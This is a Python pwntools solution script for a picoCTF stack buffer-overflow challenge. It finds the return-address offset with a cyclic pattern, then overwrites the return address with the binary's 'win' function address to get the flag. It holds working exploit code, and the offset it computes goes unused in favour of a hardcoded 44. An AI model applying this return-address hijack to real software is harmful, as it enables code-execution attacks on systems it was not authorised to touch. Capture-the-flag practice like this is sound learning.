from random import randint
from pwn import*
from src.templates import*

# 32 bit for function calls w/ arguments
'''
- pushes the arguments onto the stack:
PUSH ARGUMENT_1 (10)
PUSH ARGUMENT_2 (5)
JUMP my_func
'''

# 64 bit for function calls w/ arguments
'''
- moves the arguments into registers:
MOV RDI, 0
MOV EAX, 26
JUMP my_func
'''


clear_screen()

SERVER_IP: str = "saturn.picoctf.net"
SERVER_PORT: int = 52966



def determine_len_to_return_addr() -> int:
    '''
    
        Will send a long string, and then determine how many 
        bytes it takes to reach the return address portion of the stack
        for the function we're interested in.

    '''
    # connects to the remote server
    conn = remote(SERVER_IP, SERVER_PORT)
    # I know the BUF of input is 32, I'll do 100 just to make sure I at one point hit the return addr
    cyc = cyclic_gen()
    stack_test = cyc.get(100)
    print(f"{Cols.RED}*Test stack string to determine position of return address: {Cols.YELLOW}[ {stack_test} ] ")
    conn.sendline(stack_test)
    
    server_message = conn.recvall().decode()
    # extract the new return addr
    new_addr = server_message.split(' Jumping to ', 1)[1].strip().rstrip().replace('0x', '')
    print(f"{Cols.YELLOW}{server_message}")
    
    # converting it back to ASCII so we can figure out where in our cyclic string the return addr was replaced by
    ascii_value = bytearray.fromhex(new_addr).decode()
    print(f"{Cols.RED}*The return address was overwritten to (in ASCII): {Cols.YELLOW}[ {ascii_value} ]")

    # adding 3 bcs it'll get the start of the index (not 4 bcs we're accounting for the null terminator.)
    number_of_characters_to_overflow: int = stack_test.decode().find(ascii_value)+3

    print(f"{Cols.RED}*The position to over-write the function address starts at: {Cols.YELLOW}[ {number_of_characters_to_overflow} Bytes. ]")
    return number_of_characters_to_overflow
    
def get_win_addr() -> int:
    # retrieving the win function address
    elf = context.binary = ELF('vuln')
    addr_in_decimal = elf.sym['win']
    addr_in_hex = hex(addr_in_decimal)
    print(f"{Cols.RED}*Address of the \'win]' function: {Cols.YELLOW}[ {addr_in_hex} ]")
    return addr_in_decimal

def overwrite_return_addr(len_to_overflow: int, func_addr: int):

    conn = remote(SERVER_IP, SERVER_PORT)
    # this represents (in little endian) the address of the win() function which prints our flag
    # and this will be done from buffer overflow, the p32 -> pack32 (packing it into a 32 bit-architecture)
    # box ready-to-go
    ''' little endian representation of the win function address '''
    win_addr_in_little_endian = p32(func_addr)
    payload = b'A'*44 + win_addr_in_little_endian

    conn.sendline(payload)
    conn.interactive()

if __name__ == "__main__":
    len_to_overflow: int = determine_len_to_return_addr()
    win_func_addr: int = get_win_addr()

    overwrite_return_addr(len_to_overflow, win_func_addr)



